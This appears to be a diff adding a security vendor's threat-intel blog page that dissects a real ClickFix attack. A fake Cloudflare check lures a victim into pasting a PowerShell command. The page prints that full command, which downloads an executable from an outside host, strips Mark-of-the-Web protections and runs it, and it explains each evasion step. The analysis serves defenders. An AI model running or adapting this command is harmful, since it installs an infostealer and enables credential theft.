@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="../logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Saved Live: Deconstructing a Real-World ClickFix Attack &amp; its PowerShell Payload | EYEBALL Security</title>
+    <link rel="canonical" href="https://eyeballsecurity.com/blog/deconstructing-live-clickfix-infostealer-attack.html" />
+    <meta name="description" content="An Eyeball customer was targeted today with a highly realistic SMS/redirect scam delivering a malicious PowerShell script. We dissect the infection flow, the evasion tricks, and how client-side protection blocked the threat mid-execution." />
+    <meta name="keywords" content="ClickFix, Threat Intel, PowerShell Analysis, Evasion Techniques, Adware/Infostealer, In-The-Wild, Threat Intel, Enterprise Browser Security, Browser DLP, EYEBALL Security" />
+    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" />
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article" />
+    <meta property="og:site_name" content="EYEBALL Security" />
+    <meta property="og:title" content="Saved Live: Deconstructing a Real-World ClickFix Attack &amp; its PowerShell Payload" />
+    <meta property="og:description" content="An Eyeball customer was targeted today with a highly realistic SMS/redirect scam delivering a malicious PowerShell script. We dissect the infection flow, the evasion tricks, and how client-side protection blocked the threat mid-execution." />
+    <meta property="og:url" content="https://eyeballsecurity.com/blog/deconstructing-live-clickfix-infostealer-attack.html" />
+    <meta property="og:image" content="https://eyeballsecurity.com/blue.png" />
+    <meta property="article:published_time" content="2026-07-02T08:00:00Z" />
+    <meta property="article:section" content="Threat Intel" />
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Saved Live: Deconstructing a Real-World ClickFix Attack &amp; its PowerShell Payload" />
+    <meta name="twitter:description" content="An Eyeball customer was targeted today with a highly realistic SMS/redirect scam delivering a malicious PowerShell script. We dissect the infection flow, the evasion tricks, and how client-side protection blocked the threat mid-execution." />
+    <meta name="twitter:image" content="https://eyeballsecurity.com/blue.png" />
+
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "@id": "https://eyeballsecurity.com/blog/deconstructing-live-clickfix-infostealer-attack.html#article",
+      "headline": "Saved Live: Deconstructing a Real-World ClickFix Attack & its PowerShell Payload",
+      "description": "An Eyeball customer was targeted today with a highly realistic SMS/redirect scam delivering a malicious PowerShell script. We dissect the infection flow, the evasion tricks, and how client-side protection blocked the threat mid-execution.",
+      "datePublished": "2026-07-02T08:00:00+00:00",
+      "dateModified": "2026-10-24T10:00:00+00:00",
+      "author": {
+        "@type": "Organization",
+        "name": "EyeBall Threat Intelligence",
+        "url": "https://eyeballsecurity.com/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "EyeBall Security Inc.",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://eyeballsecurity.com/blue.png"
+        }
+      },
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://eyeballsecurity.com/blog/deconstructing-live-clickfix-infostealer-attack.html"
+      },
+      "articleSection": "Threat Intel",
+      "keywords": "ClickFix, Threat Intel, PowerShell Analysis, Evasion Techniques, Adware/Infostealer, In-The-Wild"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "EYEBALL Security",
+          "item": "https://eyeballsecurity.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Threat Intel Blog",
+          "item": "https://eyeballsecurity.com/#blog"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Saved Live: Deconstructing a Real-World ClickFix Attack & its PowerShell Payload",
+          "item": "https://eyeballsecurity.com/blog/deconstructing-live-clickfix-infostealer-attack.html"
+        }
+      ]
+    }
+  ]
+}
+    </script>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'brand-dark': '#06090E',
+              'brand-dark-secondary': '#0D1117',
+              'brand-blue': '#00B4D8',
+              'brand-cyan': '#48CAE4',
+              'brand-purple': '#9D4EDD',
+              'brand-green': '#06D6A0',
+              'brand-light': '#F8F9FA',
+              'brand-light-secondary': '#ADB5BD',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      html { scroll-behavior: smooth; }
+      .bg-grid-pattern {
+        background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px),
+                          linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px);
+        background-size: 40px 40px;
+      }
+    </style>
+
+    <!-- Umami Cloud Analytics Integration -->
+    <script defer src="https://cloud.umami.is/script.js" data-website-id="f4b2fa1b-2fcb-439e-b40d-99679f204792"></script>
+    <!-- Leadfeeder Analytics Integration -->
+    <script> (function(ss,ex){ window.ldfdr=window.ldfdr||function(){(ldfdr._q=ldfdr._q||[]).push([].slice.call(arguments));}; (function(d,s){ fs=d.getElementsByTagName(s)[0]; function ce(src){ var cs=d.createElement(s); cs.src=src; cs.async=1; fs.parentNode.insertBefore(cs,fs); }; ce('https://sc.lfeeder.com/lftracker_v1_'+ss+(ex?'_'+ex:'')+'.js'); })(document,'script'); })('lAxoEaKjZxv4OYGd'); </script>
+  </head>
+  <body class="bg-brand-dark text-brand-light font-sans antialiased flex flex-col min-h-screen">
+    <header class="bg-brand-dark/90 backdrop-blur-xl fixed top-0 left-0 right-0 z-50 border-b border-white/5">
+      <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex items-center justify-between h-20">
+          <a href="../#landing" class="flex items-center space-x-3 focus:outline-none group">
+            <img src="../blue.png" onerror="this.onerror=null; this.src='../logo.svg';" class="h-12 w-auto transition-transform duration-300 group-hover:scale-105" alt="EyeBall Logo" />
+            <span class="text-2xl font-bold text-white tracking-tight">EyeBall</span>
+          </a>
+          <div class="flex items-center space-x-4 md:space-x-6">
+            <nav class="hidden md:flex space-x-6 text-sm font-medium text-brand-light-secondary">
+              <a href="../#features" class="hover:text-white transition-colors">Features</a>
+              <a href="../#case-studies" class="hover:text-white transition-colors">Case Studies</a>
+              <a href="../#faq" class="hover:text-white transition-colors">FAQ</a>
+              <a href="../#blog" class="text-brand-blue font-bold border-b-2 border-brand-blue pb-1">Blog</a>
+            </nav>
+            <a href="../#freemium" class="bg-brand-blue hover:bg-brand-cyan text-brand-dark px-4 py-2 sm:px-6 sm:py-2.5 rounded-full text-xs sm:text-sm font-bold transition-all duration-300 shadow-lg shadow-brand-blue/20">
+              START NOW
+            </a>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main class="flex-grow pt-24">
+      <div class="container mx-auto px-4 sm:px-6 lg:px-8 py-8 max-w-7xl">
+        <article class="max-w-4xl mx-auto py-4">
+          <a href="../#blog" class="inline-flex items-center space-x-2 text-sm font-mono text-brand-blue hover:text-brand-cyan mb-8 transition group pb-2">
+            <svg class="w-4 h-4 transform group-hover:-translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+            <span>BACK TO RESOURCE DIRECTORY</span>
+          </a>
+
+          <div style="background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%)" class="h-64 sm:h-80 w-full rounded-3xl relative overflow-hidden flex flex-col justify-end p-6 sm:p-10 border border-white/15 shadow-2xl">
+            <div class="absolute inset-0 bg-brand-dark/30 backdrop-blur-[1px]"></div>
+            <div class="relative z-10">
+              <span class="inline-block px-3 py-1 mb-4 text-xs font-mono font-bold tracking-wider uppercase rounded border bg-brand-cyan/10 text-brand-cyan border-brand-cyan/25">
+                Threat Intel
+              </span>
+              <h1 class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-white leading-tight tracking-tight drop-shadow-md">
+                Saved Live: Deconstructing a Real-World ClickFix Attack &amp; its PowerShell Payload
+              </h1>
+            </div>
+          </div>
+
+          <div class="flex flex-wrap items-center justify-between py-6 border-b border-white/10 mb-10 text-sm gap-4 text-brand-light-secondary font-mono">
+            <div class="flex items-center space-x-3">
+              <div class="w-10 h-10 rounded-full bg-brand-blue/10 border border-brand-blue/30 flex items-center justify-center text-brand-blue font-bold">
+                E
+              </div>
+              <div>
+                <p class="text-white font-semibold">EyeBall Threat Intelligence</p>
+                <p class="text-xs text-brand-light-secondary">Research &amp; Analysis Group</p>
+              </div>
+            </div>
+            <div class="flex items-center space-x-6 text-xs text-brand-light-secondary font-mono">
+              <span>Published: <strong>July 2, 2026</strong></span>
+              <span>•</span>
+              <span>Read Time: <strong>6 min read</strong></span>
+            </div>
+          </div>
+
+          <div class="prose prose-invert prose-brand max-w-none text-brand-light-secondary leading-relaxed font-sans mb-16 space-y-4">
+            <h2 class="text-2xl md:text-3xl font-bold text-white mt-10 mb-4 border-b border-white/10 pb-2">Saved Live: Deconstructing a Real-World ClickFix Attack &amp; its PowerShell Payload</h2>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">Today, an Eyeball Security customer avoided a potentially devastating corporate breach when our browser-layer defense engine intervened to block a live, in-the-wild <strong class="text-white font-bold">ClickFix</strong> (also known as ClickHijacking) attack.</p>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">This case study is a classic illustration of modern social engineering tactics. It demonstrates how threat actors bypass conventional perimeter controls, manipulate user trust in third-party services, and execute highly targeted obfuscated scripts directly on local endpoints.</p>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">!<a href="MaozClickFixOptimize.gif" class="text-brand-cyan underline hover:text-brand-blue font-semibold transition">See it in action: Eyeball Browser Security identifies and blocks the malicious ClickFix CAPTCHA fake prompt, preventing the user from copying the malicious execution command.</a></p>
+<div class="h-4"></div>
+<hr class="border-t border-white/10 my-10" />
+<div class="h-4"></div>
+<h3 class="text-xl md:text-2xl font-bold text-brand-blue mt-8 mb-3">The Infection Vector: The Trusted Open Redirect</h3>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">The attack started with a simple, high-urgency message delivered directly to the client. The message claimed they had an outstanding debt with their legitimate insurance provider.</p>
+<div class="h-4"></div>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">The Bait:</strong> The user was prompted to click an SMS-delivered shortened link (e.g., via a popular URL shortener).</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">The Redirection:</strong> This shortened link resolved to the insurance provider's *actual, legitimate domain name*.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">The Exploit:</strong> However, the link exploited an open redirect vulnerability (or a subverted directory) on that trusted insurance portal. Without the address bar in the browser showing any suspicious changes, the user was silently pushed to a malicious landing page pretending to be a <strong class="text-white font-bold">Cloudflare security verification checkpoint</strong>.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">The Instruction:</strong> The fake verification overlay claimed: *"Verification Required: Please confirm your system capabilities to access the insurance portal."*</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">The Trigger:</strong> The screen instructed the victim to press <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">Win + R</code> to open their local Run prompt, copy a "security key" from a button on the webpage, paste it into their shell window, and hit Enter.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">By framing this command execution as a mandatory Cloudflare system check, the threat actor bypassed a lifetime of standard web safety warnings. To a busy employee, this looked like an annoying but legitimate login verification screen.</p>
+<div class="h-4"></div>
+<hr class="border-t border-white/10 my-10" />
+<div class="h-4"></div>
+<h3 class="text-xl md:text-2xl font-bold text-brand-blue mt-8 mb-3">The Payload: Deconstructing the PowerShell Command</h3>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">The copied string sitting in the user's clipboard buffer was the following malicious PowerShell command. Let's look at the raw instruction before we break down its evasion and download layers:</p>
+<div class="h-4"></div>
+
+        <div class="my-6 border border-white/10 rounded-2xl bg-black/40 overflow-hidden font-mono text-sm leading-relaxed text-brand-light-secondary shadow-2xl">
+          <div class="px-4 py-2 bg-white/5 border-b border-white/5 text-xs text-brand-blue uppercase font-bold tracking-wider flex justify-between items-center">
+            <span>powershell</span>
+            <span class="text-[10px] text-white/30 lowercase font-mono">Terminal Output</span>
+          </div>
+          <pre class="p-5 overflow-x-auto whitespace-pre scrolling-touch select-all text-xs md:text-sm text-brand-cyan scrollbar-thin"><code>powershell -NoP -w h -ep bypass -c &quot;$h='merabs'+'.pro';$n='5a043604.exe';$u='https://'+$h+'/'+$n;$f=$env:TEMP+'\\x.exe';[Net.WebClient]::new().('Down'+'loadFile')($u,$f);Unblock-File $f -EA 0;ri ($f+':Zone.Identifier') -EA 0;$env:SEE_MASK_NOZONECHECKS=1;&amp; $f&quot;</code></pre>
+        </div>
+      
+<div class="h-4"></div>
+<hr class="border-t border-white/10 my-10" />
+<div class="h-4"></div>
+<h3 class="text-xl md:text-2xl font-bold text-brand-blue mt-8 mb-3">Technical Deep Dive: A Defensive Analysis</h3>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">From a defense perspective, this payload is a highly efficient, multi-staged downloader designed to evade endpoint antivirus, ignore security policies, and strip default operating system safeguards.</p>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">1. Execution Parameters (The Evader Setup)</h4>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-NoP</code> (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-NoProfile</code>): Directs PowerShell not to load the user's custom interactive profile. This accelerates start time, reduces system footprint, and prevents local security profiles from altering the environment.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-w h</code> (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-WindowStyle Hidden</code>): Instructs Windows to launch the terminal completely invisibly. The victim sees no console popup, flashing cursor, or system warning. The entire operation runs silently in the background.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-ep bypass</code> (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-ExecutionPolicy Bypass</code>): Explicitly instructs PowerShell to ignore any system-wide execution policies that would otherwise block unsigned or untrusted scripts.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">2. Obfuscation Tactics (Evading Static Signatures)</h4>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">Modern endpoint defenses actively scan command-line arguments for suspicious domains or web requests. To evade signature matches (such as YARA rules), the author splits sensitive strings:</p>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">$h='merabs'+'.pro'</code> and <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">$n='5a043604.exe'</code> reconstruct the URL dynamically: <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">https://merabs.pro/5a043604.exe</code>.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">('Down'+'loadFile')</code> splits the actual .NET method call, ensuring static analysis rules watching for the <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">DownloadFile</code> function signature remain blind to the download stream.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">3. Mark-of-the-Web (MOTW) Evasion (The Crown Jewel of Evasion)</h4>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">When files are downloaded over the internet via standard web clients, Windows appends an <strong class="text-white font-bold">Alternative Data Stream (ADS)</strong> called <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">:Zone.Identifier</code>. This is how Windows knows the file came from an untrusted outside source, triggering SmartScreen warnings, blocking execution, or launching office files in a sandbox.</p>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">The threat actor uses two commands to completely erase this metadata:</p>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">Unblock-File $f -EA 0</code>: Directs PowerShell to strip the untrusted zone label from the file.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">ri ($f+':Zone.Identifier') -EA 0</code> (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">Remove-Item</code>): Forcibly deletes the <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">:Zone.Identifier</code> stream directly, ensuring no operating system warning is ever shown when the executable runs. The <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-EA 0</code> (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">-ErrorAction SilentlyContinue</code>) ensures that even if the command encounters an error, it continues executing without alerting the user.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">4. Disabling Shell Protection</h4>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">$env:SEE_MASK_NOZONECHECKS=1</code>: This modifies the current environment variables to disable automatic zone checking in <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">shell32</code>. It blocks Windows from popping up confirmation dialogs before executing downloaded files via shell utilities.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">5. Local Dropper Execution</h4>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">&amp; $f</code>: Uses the PowerShell invocation operator (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">&amp;</code>) to execute the freshly downloaded, unblocked payload (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">x.exe</code> saved under the user's <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">%TEMP%</code> folder). This executable is a known infostealer dropper designed to harvest local session cookies, crypto wallets, and browser-stored credentials.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<hr class="border-t border-white/10 my-10" />
+<div class="h-4"></div>
+<h3 class="text-xl md:text-2xl font-bold text-brand-blue mt-8 mb-3">Why Traditional Security Failed (and Why Eyeball Blocked It)</h3>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">This attack exposes the severe gaps in legacy security perimeters:</p>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Secure Web Gateways (SWG) are blind:</strong> The malicious payload was not downloaded over the HTTP session directly. The user was guided to copy-paste a string. The SWG only sees an encrypted HTTPS connection to a trusted domain, followed by a copy operation that occurs entirely in memory.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Reputation Filters are bypassed:</strong> The initial redirect URL resolved to a highly trusted corporate insurance domain. It was never on any malicious blocklist.</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Static Endpoint AVs fail:</strong> Because the download is initiated by a native, legitimate system utility (<code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">powershell.exe</code>) with obfuscated strings, traditional static heuristics frequently let the command execute unchallenged.</span>
+          </li>
+        </ul>
+<div class="h-4"></div>
+<h4 class="text-lg md:text-xl font-bold text-brand-cyan mt-6 mb-2">How Eyeball Stopped It</h4>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">Because <strong class="text-white font-bold">Eyeball Browser Security</strong> operates natively inside the web browser—the true perimeter where data interaction and execution occur—it maintains total visibility.</p>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">Eyeball's client-side heuristics instantly detected the malicious DOM overlay simulating Cloudflare, recognized the suspicious clip-hijacking behavior prompting clipboard access, and blocked the interaction before the user could copy the script. The attack was neutralized mid-flight, keeping the client's corporate network and credentials completely secure.</p>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">By securing the point of execution, Eyeball ensures that even when users are manipulated, the system remains impenetrable.</p>
+<div class="h-4"></div>
+<hr class="border-t border-white/10 my-10" />
+<div class="h-4"></div>
+<h3 class="text-xl md:text-2xl font-bold text-brand-blue mt-8 mb-3">Indicators of Compromise (IoCs)</h3>
+<div class="h-4"></div>
+<p class="text-brand-light-secondary leading-relaxed mb-5 text-base md:text-lg">To assist fellow defenders, the threat intelligence team has cataloged the indicators of compromise associated with today's live ClickFix campaign:</p>
+<div class="h-4"></div>
+<ul class="my-5 list-none">
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Malicious Dropper Host:</strong> <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">merabs.pro</code></span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Payload File Name:</strong> <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">5a043604.exe</code> (saved locally as <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">x.exe</code>)</span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">Malicious Executable SHA256:</strong> <code class="bg-white/10 text-brand-cyan px-1.5 py-0.5 rounded font-mono text-xs border border-white/5">f5d1dd9ff3a9150b655499d2580569027f242f53cbdc0c3d6813e7a0bb066c65</code></span>
+          </li>
+        
+          <li class="flex items-start mb-3 ml-4 text-brand-light-secondary">
+            <span class="text-brand-blue mr-2.5 mt-1.5 text-xs">✦</span>
+            <span><strong class="text-white font-bold">VirusTotal Analysis:</strong> <a href="https://www.virustotal.com/gui/file/f5d1dd9ff3a9150b655499d2580569027f242f53cbdc0c3d6813e7a0bb066c65" class="text-brand-cyan underline hover:text-brand-blue font-semibold transition">View Report on VirusTotal</a></span>
+          </li>
+        </ul>
+          </div>
+
+          
+            <div class="border-t border-white/10 pt-6 flex flex-wrap gap-2 items-center mb-16">
+              <span class="text-xs font-mono text-brand-light-secondary uppercase tracking-widest mr-2">Tags:</span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #ClickFix
+                </span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #Threat Intel
+                </span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #PowerShell Analysis
+                </span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #Evasion Techniques
+                </span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #Adware/Infostealer
+                </span>
+              
+                <span class="bg-white/5 border border-white/10 text-brand-light-secondary text-xs px-3 py-1 rounded-full font-mono">
+                  #In-The-Wild
+                </span>
+              
+            </div>
+          
+
+          <div class="bg-gradient-to-r from-brand-blue/10 via-brand-dark-secondary to-brand-dark border border-brand-blue/20 rounded-3xl p-8 text-center relative overflow-hidden mb-16">
+            <div class="absolute inset-0 bg-grid-pattern opacity-5"></div>
+            <h3 class="text-2xl font-bold text-white mb-2 relative z-10">Deploy Zero-Blind-Spot Browser Security</h3>
+            <p class="text-brand-light-secondary text-sm max-w-xl mx-auto mb-6 relative z-10">
+              Neutralize session token theft, ClickFix campaigns, and GenAI data leaks natively in Chrome and Edge with EYEBALL Enterprise Suite.
+            </p>
+            <a href="../#contact" class="inline-block relative z-10 bg-brand-blue hover:bg-brand-cyan text-brand-dark font-bold px-8 py-3 rounded-xl transition shadow-lg shadow-brand-blue/25 text-sm uppercase tracking-wider">
+              START NOW
+            </a>
+          </div>
+
+          <section class="border-t border-white/10 pt-12">
+            <h2 class="text-2xl font-bold text-white mb-6">More Threat Intelligence Research</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+              
+                <a href="clickfix-threat-campaigns.html" class="block bg-brand-dark-secondary border border-white/10 hover:border-brand-blue/40 rounded-2xl p-5 transition">
+                  <span class="text-[10px] font-mono uppercase text-brand-cyan block mb-2">Threat Intel</span>
+                  <h3 class="text-base font-bold text-white mb-2 line-clamp-2">The Rise of ClickFix Campaigns: How Threat Actors Bypass Enterprise Sandbox Gateways</h3>
+                  <p class="text-xs text-brand-light-secondary line-clamp-3">Threat actors are shifting away from traditional attachments towards highly interactive browser social engineering, notably through fake update popups that exploit clipboard buffers.</p>
+                </a>
+              
+                <a href="prompt-analyzer-security-compliance.html" class="block bg-brand-dark-secondary border border-white/10 hover:border-brand-blue/40 rounded-2xl p-5 transition">
+                  <span class="text-[10px] font-mono uppercase text-brand-cyan block mb-2">Generative AI</span>
+                  <h3 class="text-base font-bold text-white mb-2 line-clamp-2">Prompt Analyzer: Total Security and Visibility for Enterprise Generative AI</h3>
+                  <p class="text-xs text-brand-light-secondary line-clamp-3">Enterprise usage of GenAI tools like ChatGPT, Claude, and Gemini has doubled, raising massive compliance and intellectual property leakage threats. Here is how EyeBall resolves it.</p>
+                </a>
+              
+                <a href="modern-browser-isolation-vs-swg.html" class="block bg-brand-dark-secondary border border-white/10 hover:border-brand-blue/40 rounded-2xl p-5 transition">
+                  <span class="text-[10px] font-mono uppercase text-brand-cyan block mb-2">Browser Security</span>
+                  <h3 class="text-base font-bold text-white mb-2 line-clamp-2">Why Modern Browser Isolation Outperforms Legacy Secure Web Gateways (SWG)</h3>
+                  <p class="text-xs text-brand-light-secondary line-clamp-3">Legacy network-level security proxies introduce crippling latency and break modern complex web applications. Endpoint browser security is the breakthrough alternative.</p>
+                </a>
+              
+            </div>
+          </section>
+        </article>
+      </div>
+    </main>
+
